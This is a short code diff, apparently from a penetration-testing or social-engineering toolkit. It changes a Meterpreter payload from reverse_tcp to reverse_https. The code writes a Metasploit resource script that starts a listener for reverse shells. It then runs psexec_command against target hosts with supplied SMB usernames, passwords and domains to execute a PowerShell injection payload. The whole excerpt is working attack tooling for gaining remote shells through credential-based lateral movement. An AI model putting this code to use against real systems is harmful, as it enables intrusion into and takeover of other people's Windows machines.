@@ -85,12 +85,12 @@ try:
         setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
     filewrite.write(x86)
     filewrite.close()
-    payload = "windows/meterpreter/reverse_tcp\n"  # if we are using x86
+    payload = "windows/meterpreter/reverse_https\n"  # if we are using x86
     command = x86  # assign powershell to command
 
     # write out our answer file for the powershell injection attack
     filewrite = open(setdir + "/reports/powershell/powershell.rc", "w")
-    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" %
+    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_https\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" %
                     (port, rhosts, username, password, domain, threads, command, stage_encoding))
     filewrite.close()
     # launch metasploit below
